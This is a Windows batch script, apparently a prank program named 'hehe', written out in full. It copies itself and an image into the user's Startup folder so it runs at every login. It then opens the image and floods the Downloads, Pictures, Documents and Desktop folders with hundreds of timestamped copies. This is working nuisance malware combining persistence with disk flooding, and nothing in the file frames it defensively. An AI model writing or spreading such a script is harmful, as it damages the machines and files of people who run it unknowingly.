@echo off
Xcopy /I /Y .\hehe.bat "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

Xcopy /I /Y .\hehe.jpg "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

hehe.jpg

set rmcolon=%time::=%
set rmcomma=%rmcolon:,=%
FOR /L %%A IN (1,1,100) DO (
	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Downloads\hehe"%%A""%rmcomma%".jpg*
	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Pictures\hehe"%%A""%rmcomma%".jpg*
	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Documents\hehe"%%A""%rmcomma%".jpg*	
	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Desktop\hehe"%%A""%rmcomma%".jpg*
)


